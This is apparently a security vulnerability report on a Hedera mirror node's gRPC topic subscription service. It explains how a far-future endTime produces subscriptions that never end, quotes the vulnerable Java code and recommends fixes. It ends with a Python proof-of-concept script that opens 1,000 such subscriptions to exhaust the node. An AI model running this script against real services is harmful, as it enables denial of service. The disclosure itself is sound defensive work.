### Title
Unbounded Subscription DoS via Far-Future `endTime` in `TopicMessageServiceImpl.subscribeTopic()`

### Summary
An unprivileged external user can open a `ConsensusTopicQuery` with `startTime=0` and `endTime` set to a value far in the future (e.g., mapping to `Long.MAX_VALUE` nanoseconds, ~year 2262). The `TopicMessageFilter` validation imposes no upper bound on `endTime`, and the `isComplete()` termination check will never return `true` for such a value, causing the subscription to hold resources indefinitely. Accumulating many such subscriptions exhausts server resources and crashes the node.

### Finding Description

**Validation gap — `TopicMessageFilter.java`, lines 43–51:**
```java
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;  // no upper bound
}

@AssertTrue(message = "Start time must be before the current time")
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();  // 0 (epoch) passes
}
```
`startTime=0` passes because epoch 0 is before `now()`. `endTime=Long.MAX_VALUE` passes because it is greater than `startTime`. No maximum bound on `endTime` exists anywhere in the filter.

**Non-terminating `isComplete()` — `TopicMessageServiceImpl.java`, lines 203–215:**
```java
boolean isComplete() {
    if (filter.getEndTime() == null) return false;
    if (filter.getEndTime() < startTime) return true;
    return Instant.ofEpochSecond(0, filter.getEndTime())
            .plus(grpcProperties.getEndTimeInterval())
            .isBefore(Instant.now());
}
```
`Instant.ofEpochSecond(0, Long.MAX_VALUE)` resolves to approximately year 2262. Adding the 30-second `endTimeInterval` changes nothing. `isBefore(Instant.now())` returns `false` for ~240 years, so `isComplete()` never returns `true`.

**`pastEndTime()` never completes — lines 123–131:**
```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) return Flux.never();
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
```
This flux is used as `.takeUntilOther(pastEndTime(topicContext))` at line 73. `Flux.empty().repeatWhen(...)` only completes when `isComplete()` returns `true`. Since that never happens, `takeUntilOther` never fires, and the main subscription flux never terminates.

**`takeWhile` on `endTime` — line 80:**
```java
flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
```
With `endTime=Long.MAX_VALUE`, no real message will ever have a `consensusTimestamp` that large, so this operator never terminates the stream either.

**Exploit flow:**
1. Attacker opens a gRPC connection and sends `ConsensusTopicQuery` with `consensusStartTime.seconds=0` and `consensusEndTime.seconds=9223372035` (overflows to `Long.MAX_VALUE` nanoseconds in the filter).
2. `TopicMessageFilter` validation passes (both `@AssertTrue` methods return `true`).
3. `subscribeTopic()` creates a `TopicContext`, increments `subscriberCount`, starts historical retrieval from epoch 0 (potentially fetching the entire message history), then enters the live listener phase.
4. `pastEndTime()` polls every 30 seconds but never completes; the subscription is immortal.
5. The attacker opens additional connections (each limited to 5 concurrent calls by `maxConcurrentCallsPerConnection`, but there is no global connection cap), multiplying the number of live subscriptions.
6. Each subscription holds a `TopicContext`, reactive scheduler threads, database connections (via the safety-check gap-recovery path), and listener registrations.
7. Resources exhaust; the node crashes or becomes unresponsive.

### Impact Explanation
Each immortal subscription consumes: a `TopicContext` object, a `subscriberCount` slot, a `boundedElastic` scheduler thread (safety check), a live listener registration, and periodic database queries every 30 seconds. With no global subscription limit, an attacker with multiple connections can accumulate hundreds of such subscriptions. Memory, thread pool, and database connection pool exhaustion leads to node crash or complete unavailability — matching the stated scope of "shutdown of ≥30% of network processing nodes."

### Likelihood Explanation
The attack requires zero privileges: the gRPC `subscribeTopic` endpoint is publicly accessible. The only per-connection throttle is `maxConcurrentCallsPerConnection=5`, which is trivially bypassed by opening more connections. The crafted query is a single valid protobuf message. The attack is fully repeatable and automatable with a simple script.

### Recommendation
1. **Add an upper bound on `endTime`** in `TopicMessageFilter.isValidEndTime()`: reject any `endTime` beyond a configurable maximum (e.g., `now() + maxSubscriptionDuration`).
2. **Add a global subscription limit**: track `subscriberCount` and reject new subscriptions above a configurable threshold.
3. **Add a maximum subscription duration**: use `flux.timeout(maxDuration)` or enforce a wall-clock deadline independent of `endTime`.
4. **Validate `startTime` minimum**: reject `startTime` values older than a configurable retention window to prevent full-history scans.

### Proof of Concept
```python
import grpc
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_topic_query_pb2, timestamp_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_topic_query_pb2.ConsensusTopicQuery()
query.topicID.topicNum = 1  # any existing topic
query.consensusStartTime.CopyFrom(timestamp_pb2.Timestamp(seconds=0, nanos=0))
query.consensusEndTime.CopyFrom(timestamp_pb2.Timestamp(seconds=9223372035, nanos=0))

# Open many connections, 5 streams each
for _ in range(200):
    channel = grpc.insecure_channel("mirror-node-grpc:5600")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for _ in range(5):
        stub.subscribeTopic(query)  # non-blocking; subscription never terminates

# Node memory/thread exhaustion occurs as subscriptions accumulate
```
